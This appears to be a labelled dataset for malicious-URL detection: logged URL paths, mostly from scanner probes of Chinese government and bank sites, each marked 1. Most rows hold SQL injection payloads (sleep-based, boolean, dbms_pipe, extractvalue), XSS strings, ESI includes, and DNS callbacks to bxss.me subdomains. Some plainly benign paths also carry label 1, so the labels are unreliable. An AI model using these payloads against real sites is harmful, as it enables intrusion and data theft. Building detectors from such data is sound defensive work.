sentences	labels
/****/clhlbj/images/ \r\n\r\n 	 1
/*/doinfo/addinfo.php?submit=添加信息&classid=1'""()&%<acx><script >87cm(9888)</script>&enews=maddinfo&mid=1 \r\n\r\n 	 1
/******/system/2021/06/09/013399706'""/><script >alert(2291);</script >.shtml \r\n\r\n 	 1
/****/zgsdt/zgs16/201610/t20161013_103270.html' and 'x'='x \r\n\r\n 	 1
/************/search.do?begin=20200819&end=20210819&eq=1&oq=1&p=0""xor(if(now()=sysdate(),sleep(15),0))xor""z&pg=1&pos=filenumber&q=请输入关键词&searchid=44&tpl=16&websiteid= \r\n\r\n 	 1
/************/'""()&%<acx><script >nn9n(9186)</script>/jcse/110105008056111/16/images/plugin/criteria/css.css \r\n\r\n 	 1
/******/bankoflanzhou/ \r\n\r\n 	 1
/***/0/00/69/91/699157_264159.jpg \r\n\r\n 	 1
/script'||'/*/1905211146429566.js \r\n\r\n 	 1
/**********/system/2012/03/01/010663634.shtml \r\n\r\n 	 1
/*******/template/jcse/110105008056111/16/images/main.css \r\n\r\n 	 1
/******/system/2018/01/14/javascript:window.close(); \r\n\r\n 	 1
/0""xor(if(now()=sysdate(),sleep(15),0))xor""z/**/widgets/hanweb/placeholder/placeholder.js \r\n\r\n 	 1
/****/web/search?page=2&channelid=253477&searchword=1&keyword=1&orderby=-docreltime&perpage=15 \r\n\r\n 	 1
/****/system/2013/02/21/javascript:dozoom(12) \r\n\r\n 	 1
/****/zjdt/csjs/gzdt/11.htm \r\n\r\n 	 1
/***/interface/daily_clickcount.json.jsp?callback=jquery171030196352313975305_1632325579270') or 2814=2814 # \r\n\r\n 	 1
/**/ui'""()&%<acx><script >jl8q(9116)</script>/lib/easyui/plugins/jquery.linkbutton.js \r\n\r\n 	 1
/****/tzgg/tz17_6387/201811/t20181126_197777.html' and 'x'='x \r\n\r\n 	 1
/******/download/downfile.jsp?classid=0&filename=8ffb8746f7374969ba1a903f538b94d4.doc and 5823=7764 \r\n\r\n 	 1
/****/thumb.php?src=<body onload=alert(777)>.jpg \r\n\r\n 	 1
/*******/bssh/?green=1 and '~~' '~' @@version '~~' '~'>0 \r\n\r\n 	 1
/**/0'xor(if(now()=sysdate(),sleep(15),0))xor'z.do \r\n\r\n 	 1
/****/web/search?page=2&channelid=253477' or 9146=9146 /*&searchword=1&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10 \r\n\r\n 	 1
/******/resource/js/news'||'/newscontent.js \r\n\r\n 	 1
/******/zsn/index.html/"><script>alert(334)</script> \r\n\r\n 	 1
/**/api-getmodel-api-sql-sql=select concat(account,0x7a656e74616f636d735f73716c5f73716c69) from zt_user \r\n\r\n 	 1
socket.gethostbyname(""hitbp"" ""hprmrvybad890.bxss.me."")[3].to_s) ""/****/bmjs/qtdw/ \r\n\r\n 	 1
/jsearchfront'""()&%<acx><script >vv4o(9602)</script>/********/jcse/110105008056111/16/images/plugin/hotnews/js.js \r\n\r\n 	 1
/***/index.php \r\n\r\n 	 1
/****/b-233956.html \r\n\r\n 	 1
/***/user/job/lib/ap_resume_intention.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects1) \r\n\r\n 	 1
/**/reviews/index?review_id=&statuses[]=open&statuses[]=reopened&severities[]=&projects[]=&author_login=&assignee_login="">alert(/777/)&false_positives=without&sort=&asc=false&commit=search \r\n\r\n 	 1
/****/web/search?channelid=-1 or 5230=6361#&perpage=1000 \r\n\r\n 	 1
/*******/haktkf.php \r\n\r\n 	 1
/***/index.php?do=post&id=415&c=dt&a=goods& \r\n\r\n 	 1
/************/template/jcse/110105008056111/**/and/**/7659=7659/16/images/plugin/category/js.js \r\n\r\n 	 1
/******/n236753/n236781/c1556969'||'/content.html \r\n\r\n 	 1
/wp-content/*******/woocommerce/assets/js/zeroclipboard/zeroclipboard.swf?id="))}catch(e){}if(!self.a)self.a=!prompt(document.domain)//&width&height \r\n\r\n 	 1
/*******/mkgva70.php \r\n\r\n 	 1
/******/n42746/index'||'_244329_10.html \r\n\r\n 	 1
/************/categorysearch.do?cateid=1&eq=1&oq=1&p=1&pg=15&pos=1&pq=1&q=请输入关键词&ranksign=1&searchid=1&total=1&tpl=/xfs.bxss.me&websiteid=110105008056111 \r\n\r\n 	 1
/****/zzxxgk/tjj/zfxxgkml_2127/jytabljg_2061/list.html?new=if(now()=sysdate(),sleep(15),0) \r\n\r\n 	 1
/****/rsxcsx//*/-->'""></iframe></script></style></title></textarea><script >alert(23728)</script> \r\n\r\n 	 1
/****/bwcx/dtbb/jtdt/202001/t20200119_241938.html \r\n\r\n 	 1
/****/src/compose.php?mailbox=</script><script>alert(document.domain)</script> \r\n\r\n 	 1
/zwgk'||'/******/ncwywfgz/wzs/ltq/xmb_gzdxb.htm \r\n\r\n 	 1
/******/resource/js/jquery/ \r\n\r\n 	 1
/***/mobiledoc/jsp/ccmr/clientportal/login.jsp?strmessage=<img src=/ onerror="alert(777)"/> \r\n\r\n 	 1
/*******/show/rose.php \r\n\r\n 	 1
/****/czgk/bmyjs/zzqdwzfbmgljgsydw/jst/\"javascript:void(0)\" \r\n\r\n 	 1
/******/1/hanweb.min"" and 2*3*8=6*8 and ""yz1j""=""yz1j.css \r\n\r\n 	 1
/****/gjzqq/index.html?continent=%' and 8913=8982 and '%'=' \r\n\r\n 	 1
/***/col195/bxss.me/t/xss.html? \r\n\r\n 	 1
/**/sys/sys/listabd2.jsp?bd="/><script>alert(777)</script> \r\n\r\n 	 1
/****/czyjsgk%' and 2*3*8=6*8 and 'lr1h'!='lr1h%.htm \r\n\r\n 	 1
/****/zzxxgk%' and 2*3*8=6*8 and 'ozey'!='ozey%/tjj/zfxxgkml_2127/hygq_2064/list.html \r\n\r\n 	 1
/****/wdsjs/hfswsj/202109<esi:include src=""http://bxss.me/rpb.png""/>/t20210906_186411.html \r\n\r\n 	 1
/******/n42746/index'||'_244329_1.html \r\n\r\n 	 1
/****/jsly/wlzb/201610/t20161014_103595.html' and 'x'='x \r\n\r\n 	 1
/****/web/search?searchword=1&channelid=287219&perpage=24' and 1=dbms_pipe.receive_message(chr(90)||chr(80)||chr(71)||chr(74),0)-- &templet=1&token=1 \r\n\r\n 	 1
/investors-garden/***/index'||'_2.html \r\n\r\n 	 1
/****/中国减贫学?page=1'""()&%<acx><script >izls(9385)</script> \r\n\r\n 	 1
/****/web/search?page=2&channelid=253477&searchword=1&keyword=1&orderby=-docreltime and if(now()=sysdate(),sleep(0),0)/*'xor(if(now()=sysdate(),sleep(0),0))or'""xor(if(now()=sysdate(),sleep(0),0))or""*/&perpage=15&outlinepage=10 \r\n\r\n 	 1
/****/rwfc/202107/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase \r\n\r\n 	 1
/************/template/jcse/110105008056111/16/images//xfs.bxss.me/selectpick/css.css \r\n\r\n 	 1
/******/n42821/n42825/index'||'.html \r\n\r\n 	 1
/****/system/2016/08/25/javascript:dozoom(9) \r\n\r\n 	 1
/************/search.do?begin=20201012&end=20211012'""()&%<acx><script >6qjr(9597)</script>&eq=1&oq=1&p=1&pg=1&pos=filenumber&q=请输入关键词&searchid=44&tpl=16&websiteid= \r\n\r\n 	 1
/****/zt/2017nb/zzqrmzf/\"javascript:void(0)\" \r\n\r\n 	 1
/'.gethostbyname(lc('hitgb'.'hnhjomwt6650a.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(111).chr(81).chr(106).chr(66).'/******/2013/list.html \r\n\r\n 	 1
/******/download/downfile.jsp?classid=0' and 8584=8584 and 'dzfs'='dzfs&filename=187b8cf8c65b4c7e97230bf0e01cd0d4.xls \r\n\r\n 	 1
/***/index.php?action=list&order=name&srt=yes&lang=en"/><script>alert(777);</script> \r\n\r\n 	 1
/****/zfwjn/1088/1103/list.html?new=0.44090732491074247'""()&%<acx><script >thmh(9100)</script> \r\n\r\n 	 1
/*****/index.php?do=search&search="><body onload=eval(alert(777)) ><!-- \r\n\r\n 	 1
/'""()&%<acx><script >dwaj(9919)</script>/*****/1079/1081/list.html \r\n\r\n 	 1
/********/index.php?vyhl='>alert(777)&lang=cze \r\n\r\n 	 1
/*****/admin/upgrade_unattended.php?db_type=<script>alert(777)</script> \r\n\r\n 	 1
/****/czgk/bmyjs/rmtt/gsl/\"javascript:void(0)\" \r\n\r\n 	 1
/****/system/2017/03/31/javascript:dozoom(12) \r\n\r\n 	 1
/****/system/2021/10/27/javascript:window.close(); \r\n\r\n 	 1
/****/system/2012/10/12/javascript:dozoom(12) \r\n\r\n 	 1
/****/web/search?page=2&channelid=253477&searchword=1&keyword=1&orderby=-docreltime&perpage=15') and 4093=4093 and '1'='1&outlinepage=10 \r\n\r\n 	 1
socket.gethostbyname(""hitbz"" ""lgqjbofgbf0de.bxss.me."")[3].to_s) ""/******/tjj/zfxxgkml_2127/hygq_2064/list.html \r\n\r\n 	 1
/****/web/search?searchword=1&channelid=287219&perpage=24&templet=1%' and 1=dbms_pipe.receive_message(chr(90)||chr(80)||chr(71)||chr(74),0)-- &token=1 \r\n\r\n 	 1
/*******/mb2.php \r\n\r\n 	 1
/*******/gnj6x.php \r\n\r\n 	 1
/******/contact-us' and 2*3*8=6*8 and 'wg7i'='wg7i/ \r\n\r\n 	 1
/**/0""xor(if(now()=sysdate(),sleep(15),0))xor""z/lib/security/crypto-js.js \r\n\r\n 	 1
/*****/user/job/lib/ap_resume_position.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects1) \r\n\r\n 	 1
/***//<script>alert`46099`</script> \r\n\r\n 	 1
/****//xfs.bxss.me/hfswsj/zmhdyc.html \r\n\r\n 	 1
/****/bmkx/bxss.me/t/xss.html? \r\n\r\n 	 1
/****/system/2021/03/18/javascript:window.print() \r\n\r\n 	 1
/******/0'xor(if(now()=sysdate(),sleep(3),0))xor'z/ \r\n\r\n 	 1
/***/data:image/svg xml;charset=utf-8,<svg xmlns='http://www.w3.org/2000/svg' viewbox='0 0 27 44'><path d='m0,22l22,0l2.1,2.1l4.2,22l19.9,19.9l22,44l0,22l0,22l0,22z' fill='#007aff'/></svg> \r\n\r\n 	 1
/***/cgi-bin/ipinfo.cgi?alert(777) \r\n\r\n 	 1
/***/'""()&%<acx><script >usz4(9457)</script>/index.html \r\n\r\n 	 1
/******/_content/download.jsp?urltype=news.downloadattachurl&owner=1707212448') or 2659=2659  \r\n\r\n 	 1
/********/20190325/javascript:void(0); \r\n\r\n 	 1
/**********/system/2021/06/22/javascript:void(0); \r\n\r\n 	 1
/**/gjzqq/api-getmodel-api-sql-sql=select concat(account,0x7a656e74616f636d735f73716c5f73716c69) from zt_user \r\n\r\n 	 1
/****/0""xor(if(now()=sysdate(),sleep(12),0))xor""z/bzxajgc/gys.htm \r\n\r\n 	 1
/****/mavideo/gvideos.php?gid=1 and 1=1 \r\n\r\n 	 1
/**/mswpmm/common/signin.aspx?cbautosignin=""alert(777) \r\n\r\n 	 1
/************/account-opening-process/2017-01-13/0'xor(if(now()=sysdate(),sleep(9),0))xor'z.html \r\n\r\n 	 1
/******/download/down.jsp?i_id=194814&colid=72') and 3163=3163 and ('euuy'='euuy \r\n\r\n 	 1
/*******/app?adminemail=<script>alert(777)</script>&smtpserver=127.0.0.1&smtpport=25&smtpuser=<script>alert(777)</script>&smtppassword=admin&smtpsecurity=none&proceedbutton=save&operation=config&st=savesmtp \r\n\r\n 	 1
/*****/dmqh/ \r\n\r\n 	 1
/*****/main/admin/session_edit.php?page=resume_session.php" onmouseover=confirm(777)//&id=1 \r\n\r\n 	 1
/***********/jinrongqihuo/guzhiqihuo/2021-01-0""xor(if(now()=sysdate(),sleep(6),0))xor""z/1713.html \r\n\r\n 	 1
/config-browser/showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase \r\n\r\n 	 1
/**/mswpmm/common/signin.aspx?tbpassword=alert(777)returnurl=/mswpmm/common/default.aspx \r\n\r\n 	 1
/xwzx' and 2*3*8=6*8 and 'j93o'='j93o/****/sgaj/201812/t20181208_112298.html \r\n\r\n 	 1
/****/zdlygk/0""xor(if(now()=sysdate(),sleep(12),0))xor""z/szss/plx.htm \r\n\r\n 	 1
/*******/yt.php \r\n\r\n 	 1
/*****/system/2012/03/02/010667948.shtml \r\n\r\n 	 1
/****/zdlygk/ncwywfgz/zws/znx/xmb_gzdxb%' and 2*3*8=6*8 and 'xo9c'!='xo9c%.htm \r\n\r\n 	 1
/***/col195//xfs.bxss.me.html \r\n\r\n 	 1
/******/business-area' and 2*3*8=6*8 and '6xd9'='6xd9/quotation-service/ \r\n\r\n 	 1
/******/jslib/ckplayer/ckplayer.js/""><script>alert(4609)</script>?_=1630312075385 \r\n\r\n 	 1
/zwgk' and 2*3*8=6*8 and 'wu4k'='wu4k/*******/zfxxgkzd/1.htm \r\n\r\n 	 1
/*****/system/2019/03/22/javascript:window.close(); \r\n\r\n 	 1
socket.gethostbyname(""hithx"" ""idvruowtd5dcb.bxss.me."")[3].to_s) ""/*****/voice.css \r\n\r\n 	 1
/art<esi:include src=""http://*******/rpb.png""/>/2021/10/11/art_34_242319.html \r\n\r\n 	 1
/****/xxgkml/lzyj/list.html?new='.gethostbyname(lc('hitbx'.'spvfhpag08b72.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(120).chr(82).chr(112).chr(65).' \r\n\r\n 	 1
/***/wap.php \r\n\r\n 	 1
/**********/system/2014/05/05/011388733_01.shtml \r\n\r\n 	 1
/*******/5s753ug.php \r\n\r\n 	 1
/**/ui'||'/css/page.css \r\n\r\n 	 1
/************/http://bxss.me/t/fit.txt?.jpg/jcse/110105008056111/16/images/jquery.waterfall.js \r\n\r\n 	 1
/****/system/2021/07/31/javascript:window.close(); \r\n\r\n 	 1
/****/swb/ltgsz.com?n=11' and 9140=9140 and 'fkoi'='fkoi \r\n\r\n 	 1
/****/20211012/javascript:void(0); \r\n\r\n 	 1
/*******/5tzwu1.php \r\n\r\n 	 1
/***/?icl_action=reminder_popup&target=javascript:alert(777);// \r\n\r\n 	 1
/*****/main/calendar/agenda_list.php?type=personal' onmouseover='confirm(777)'/><!-- \r\n\r\n 	 1
/****/czgk/bmyjs/zzqzfzcbmyzstsjg/\"javascript:void(0)\" \r\n\r\n 	 1
/************/template/jcse/website.js/""><script>alert(4688)</script> \r\n\r\n 	 1
/****/bxss.me/2012/list.html \r\n\r\n 	 1
/***/getallchannels?vno=3.5.0'and's'='s \r\n\r\n 	 1
/****/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/bzxajgc/szss/plx.htm \r\n\r\n 	 1
/****/web/search?page=2&channelid=253477&searchword=1&keyword=1&orderby=-docreltime%' and 1=dbms_pipe.receive_message(chr(90)||chr(80)||chr(71)||chr(74),0)-- &perpage=15&outlinepage=10 \r\n\r\n 	 1
/******/jslib/ckplayer/ckplayer.js/<img src="javascript:alert(1077)">?_=1630311731384 \r\n\r\n 	 1
/******/jslib/ckplayer/ckplayer.js/"><script>alert(3759)</script>?_=1630312049002 \r\n\r\n 	 1
/zwgk'||'/******/gczlzl/1.htm \r\n\r\n 	 1
/****/web/search?searchword=1&channelid=287219&perpage=24&templet=1' and 5311=5311 and '1'='1&token=1 \r\n\r\n 	 1
/***/interface/daily_clickcount.json.jsp?callback=jquery171030196352313975305_1632325579270%') or 0706=0706 and '%'=' \r\n\r\n 	 1
/****/wp-admin/post-new.php?post_type=inbound-forms&post='>alert(777) \r\n\r\n 	 1
/****/' and 'x'='y \r\n\r\n 	 1
/*****/system/2012/01/14/javascript:window.close(); \r\n\r\n 	 1
/****/system/2021/04/22'""/>< \r\n\r\n 	 1
/****/wp-admin/admin-ajax.php \r\n\r\n 	 1
/**********/system/more/217000000000000/0045/217000000000000_00004535.shtml/""><script>alert(244)</script> \r\n\r\n 	 1
/******/jslib/ckplayer/ckplayer.js/"><script>alert(571)</script>?_=1630311519791 \r\n\r\n 	 1
/****/zfwjn/1088/1105/list.html?new="".gethostbyname(lc(""hitpo"".""olzowkho8cacd.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(112).chr(85).chr(117).chr(89)."" \r\n\r\n 	 1
/****/wdsjs/hfswsj/201902/t20190227_114790.html \r\n\r\n 	 1
/**/ui//xfs.bxss.me/cookie/jquery.cookie.js \r\n\r\n 	 1
/****/czgk/bmyjs/gmzdp/\"javascript:void(0)\" \r\n\r\n 	 1
/if(now()=sysdate(),sleep(15),0)/**/encrypt/md5.js \r\n\r\n 	 1
/******/lxqz/jb/"><script>alert(553)</script> \r\n\r\n 	 1
/****/yqzt/bsap/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase \r\n\r\n 	 1
/******/visitcount/visit.jsp?i_articleid=5195&i_columnid[0]==2and 3 in &i_columnid[1]=3"and/**/extractvalue(1,concat(char(126),md5(1578504846)))and"&i_webid=1&type=3 \r\n\r\n 	 1
/******/?icl_action=reminder_popup&target=javascript:alert(777);// \r\n\r\n 	 1
socket.gethostbyname('hitkd' 'fwxpzvdva57f3.bxss.me.')[3].to_s) '/****/list.html \r\n\r\n 	 1
/**/admin/ccmanage.php?find_enc=1&list=1"><script>alert(777)</script> \r\n\r\n 	 1
/*******/77w6.php \r\n\r\n 	 1
/****/wp-content/plugins/easyrotator-for-wordpress/b.php \r\n\r\n 	 1
/****/xxgknb/2008/list.html?new='.gethostbyname(lc('hitew'.'qzohlkax39949.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(122).chr(90).chr(119).chr(84).' \r\n\r\n 	 1
/****/qzfwj/5619/5625/\"javascript:void(0)\" \r\n\r\n 	 1
/**/sustainability/csrreports/201908/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase \r\n\r\n 	 1
/**********/system/2021/09/07/013447361'"/><img src=javascript:alert(812)>.shtml \r\n\r\n 	 1
/*****/system/2021/12/09/javascript:window.print() \r\n\r\n 	 1
/*****/system/2019/10/28/javascript:void(0); \r\n\r\n 	 1
/******/resource/interview/room.jsp?wbinterviewid=1033&owner=1707212448%' or 2971=6140 and '%'=' \r\n\r\n 	 1
/***/admin/default/install_plugin/dasdasdasdad?plugin=math2py&source=javascript:alert(777) \r\n\r\n 	 1
/***/interface/daily_clickcount.json.jsp?callback=jquery171030196352313975305_1632325579270') and 0525=2325 and '1'='1 \r\n\r\n 	 1
/*******/libs/magpierss/scripts/magpie_simple.php?url=""><img src= x onerror = alert(777)>url=""> \r\n\r\n 	 1
/**/ui/widgets/scrollup/css/themes/image%' and 2*3*8=6*8 and '14lu'!='14lu%.css \r\n\r\n 	 1
/******/resource/interview/room.jsp?wbinterviewid=1033') or 5368=9122 and '1'='1&owner=1707212448 \r\n\r\n 	 1
/*******/sccba/10596/10711/2013/12/04/20131204162632002948461/javascript:; \r\n\r\n 	 1
/****/admin/upgrade_unattended.php?db_type=<script>alert(777)</script> \r\n\r\n 	 1
/****/system/2006/08/22/javascript:window.close(); \r\n\r\n 	 1
/**********/2021-0""xor(if(now()=sysdate(),sleep(12),0))xor""z-24 .html \r\n\r\n 	 1
/******/resource/code/news/click/clicktimes.jsp?wbnewsid=67934&owner=1707212448&type=wbnewsfile&randomid=nattach \r\n\r\n 	 1
/******/resource/interview/room.jsp?wbinterviewid=1033&owner=1707212448%' and 6226=6226 and '%'=' \r\n\r\n 	 1
/**********/system/2021/06/17/javascript:window.print() \r\n\r\n 	 1
/****/zfwjn/1079/1081'""()&%<acx><script >dwaj(9657)</script>/list.html \r\n\r\n 	 1
/****/if(now()=sysdate(),sleep(12),0)/25187.htm \r\n\r\n 	 1
/**/ui/lib/easyui<esi:include src=""http://bxss.me/rpb.png""/>/plugins/jquery.panel.js \r\n\r\n 	 1
/wp-content/*******/nextgen-gallery/xml/media-rss.php?mode=<script>alert(lscs62mk)</script> \r\n\r\n 	 1
/******/_content/download.jsp?urltype=news.downloadattachurl') or 8808=4642  \r\n\r\n 	 1
/***/col138/index.html/"><script>alert(454)</script> \r\n\r\n 	 1
/****/document.location.href \r\n\r\n 	 1
/*******/aawm.php \r\n\r\n 	 1
/***/cgi-bin/module/sharedobjmanager/policy_new/874/policytable?vdom="'/></script><script>alert(777)</script> \r\n\r\n 	 1
/******/jslib/icons/ \r\n\r\n 	 1
/****/gccb/dlgc/' and 'x'='y \r\n\r\n 	 1
/****/jsrpc.php?type=0&mode=1&method=screen.get&profileidx=web.item.graph&resourcetype=17&profileidx2=updatexml(0,concat(0xa,md5(2075070484)),0) \r\n\r\n 	 1
/**********/system/2011/11/28/010549976.shtml \r\n\r\n 	 1
/******/wp_rokbox/thumb.php?src=<body onload=alert(777)>.jpg \r\n\r\n 	 1
/****/system/2021/09/07/013446963.shtml \r\n\r\n 	 1
/******/jslib/ckplayer/ckplayer.js/"><script>alert(389)</script>?_=1630311387505 \r\n\r\n 	 1
/*******/bysrd/201610/t20161016_531.html \r\n\r\n 	 1
/********/sys/sys/listabd2.jsp?bd="/><script>alert(777)</script> \r\n\r\n 	 1
/****/system/2021/09/08/javascript:void(); \r\n\r\n 	 1
/****//screens/switch/switch_mon.html?mode=plog-custom&mode-title=test</td><img width=1 height=1 src=/images/logo-mobility-controller.gif onload=alert(777)> \r\n\r\n 	 1
/****/长三角?page='""()&%<acx><script >qn4d(9817)</script> \r\n\r\n 	 1
/****/jtdt/2019_jtyw/201907/t20190715_220163.html \r\n\r\n 	 1
/****/xxgkml/zfczyjs/"".gethostbyname(lc(""hitgl"".""hyaslddy0f211.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(101).chr(70).chr(110).chr(90)."".html \r\n\r\n 	 1
/******/system/2018/01/24/javascript:window.close(); \r\n\r\n 	 1
/***********/zaojianpinglun/javascript:void(0) \r\n\r\n 	 1
/****/zzxxgk/tjj/zfxxgkml_2127/hygq_2064/"".gethostbyname(lc(""hitme"".""jlapriswb37e9.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(113).chr(82).chr(106).chr(79)."".html \r\n\r\n 	 1
/***/0/01/25/11/1251134_532797.jpg \r\n\r\n 	 1
/****/system/2021/04/22'""/><iframe src=javascript:alert(2392)>/013373702.shtml \r\n\r\n 	 1
/****/zfwjn/1088/1105/list.html?new='.gethostbyname(lc('hitpv'.'jlryayfm899b5.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(104).chr(67).chr(101).chr(86).' \r\n\r\n 	 1
/****/rdhy/if(now()=sysdate(),sleep(12),0).htm \r\n\r\n 	 1
/****/zzxxgk/tjj/zfxxgkml_2127/hygq_2064/http://bxss.me/t/fit.txt?.jpg.html \r\n\r\n 	 1
/**/system/2021/10/22/ \r\n\r\n 	 1
/****/jrnx.htm \r\n\r\n 	 1
/**********/system/2017/09/11/012412201.shtml \r\n\r\n 	 1
/0""xor(if(now()=sysdate(),sleep(12),0))xor""z/******/ywdt/1.htm \r\n\r\n 	 1
/*****/system/2020/10/26/javascript:window.close(); \r\n\r\n 	 1
/****/xxgkzn/'""()&%<acx><script >04kx(9016)</script>.html \r\n\r\n 	 1
/***/productlistcategory.html?productcategoryid=(select char(97) char(110) char(111) char(110) char(121) char(109) char(111) char(117) char(115) char(95) char(115) char(104) char(111) char(112))&price1=3079&&price2=3319 \r\n\r\n 	 1
/*****/libs/magpierss/scripts/magpie_simple.php?url=""><img src= x onerror = alert(777)>url=""> \r\n\r\n 	 1
/******/download/downfile.jsp?classid=0&filename=aa5b6197abf74d70b14ec83b8819378f.doc and 8578=6698 \r\n\r\n 	 1
/****/if(now()=sysdate(),sleep(12),0)/gczlzl/1.htm \r\n\r\n 	 1
/******/system/2016/02/29/javascript:window.close(); \r\n\r\n 	 1
/****/zxft' and 2*3*8=6*8 and 'hu7n'='hu7n/ \r\n\r\n 	 1
/***/nbhd/opengovmsgbox.do?appid=4&method=listgovmsgboxs&pagesize=3&siteid=extractvalue(1,concat(char(126),md5(1381995244))) \r\n\r\n 	 1
/**/ui/widgets/scrollup/css/http://bxss.me/t/xss.html? \r\n\r\n 	 1
/**/wp-content/plugins/nextgen-gallery/nggallery.php?test-head='"">alert(777); \r\n\r\n 	 1
/****/web/search?page=2&channelid=253477&searchword=1&keyword=1' or 7140=5232  \r\n\r\n 	 1
/*/210514-1'""()&%<acx><script >rsbr(9996)</script>/index/93aa5449bf388d846409a3d11e199a08.css \r\n\r\n 	 1
/****/20190103/javascript:void(0); \r\n\r\n 	 1
/****/server-session-details.jsp?hostname=""/>alert(777) \r\n\r\n 	 1
/****/mswpmm/common/signin.aspx?tbemailaddress=alert(777)returnurl=/mswpmm/common/default.aspx \r\n\r\n 	 1
/****/http://bxss.me/t/fit.txt?.jpg/2014/list.html \r\n\r\n 	 1
/****/bmkx/sgaj/bxss.me/t/xss.html? \r\n\r\n 	 1
/****/gjzqq/index.html?continent=') and 7475=2093 and ('1'='1 \r\n\r\n 	 1
/****/石阡县 \r\n\r\n 	 1
/*******/sccba/20518/20526/20567/javascript:; \r\n\r\n 	 1
/******/visitcount/visit.jsp?i_articleid=239572&i_webid=1&i_columnid=37&type=3 and 1=1 \r\n\r\n 	 1
/***/getsendsmscount.ashx \r\n\r\n 	 1
/******/visitcount/visit.jsp?i_columnid[0]=exp&i_columnid[1]==convert(int,sys.fn_sqlvarbasetostr(hashbytes('md5','1188843706')))&i_webid=1&type=1 \r\n\r\n 	 1
/************/template/jcse'||'/110105008056111/16/images/plugin/selectpick/js.js \r\n\r\n 	 1
/xxgk%' and 2*3*8=6*8 and 'qir5'!='qir5%/******/zfczyjs/list.html \r\n\r\n 	 1
/**/http://bxss.me/t/fit.txt/lib/easyui/plugins/jquery.linkbutton.js \r\n\r\n 	 1
/****/reporting/admin/notificationpopup.php?new=1&type=cr&height=alert(777) \r\n\r\n 	 1
/******/resource/interview/room.jsp?wbinterviewid=1033%' and 4118=9913 and '%%'='%&owner=1707212448 \r\n\r\n 	 1
/******/system/2016/03/02/javascript:window.print() \r\n\r\n 	 1
/xxgk'||'/*****/1088/1105/list.html \r\n\r\n 	 1
/****/web/search?channelid=234439&orderby=relevance' and 7051=7051  \r\n\r\n 	 1
/******/1/language.js/<img src="javascript:alert(7564)"> \r\n\r\n 	 1
socket.gethostbyname('hitwv' 'asaulhyx94a73.bxss.me.')[3].to_s) '/*****/hfswsj/zmhdyc.html \r\n\r\n 	 1
/****/system/2021/09/15/javascript:window.close(); \r\n\r\n 	 1
/****/system/2020/04/01/javascript:window.close(); \r\n\r\n 	 1
/****/zdlygk%' and 2*3*8=6*8 and 'jsbf'!='jsbf%/bzxajgc/ycs/hlx.htm \r\n\r\n 	 1
/***********/shangpinqihuo/nongchanpin/2021-01-14/0'xor(if(now()=sysdate(),sleep(3),0))xor'z.html \r\n\r\n 	 1
/****/system/2012/04/06/javascript:dozoom(14) \r\n\r\n 	 1
/****/web/search?searchword=??????&channelid=254846 and 1=1 \r\n\r\n 	 1
/************/template/jcse/110105008056111/16/images/plugin/websitechange/zwfwv3'||'.js \r\n\r\n 	 1
/****/user/job/lib/ap_resume_workcity.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects) \r\n\r\n 	 1
/*******/wp-admin/admin.php?where1=alert(777)&searchsubmit=buscar&page=nsp_search \r\n\r\n 	 1
/***/http://bxss.me/t/xss.html? \r\n\r\n 	 1
/******/download/downfile.jsp?classid=0&filename=8ffb8746f7374969ba1a903f538b94d4.doc%' and 7471=2837 and '%'=' \r\n\r\n 	 1
/****/20211027/javascript:void(0); \r\n\r\n 	 1
/****/category/pinpaijianshe?page=1 and 2489=5073# \r\n\r\n 	 1
/************/interfaces/dimension.do?begin=&end=&eq=&oq=&p=1&pg=1&pos=&pq=&q=请输入关键词&searchid=1&tpl=16&websiteid=0'xor(if(now()=sysdate(),sleep(15),0))xor'z \r\n\r\n 	 1
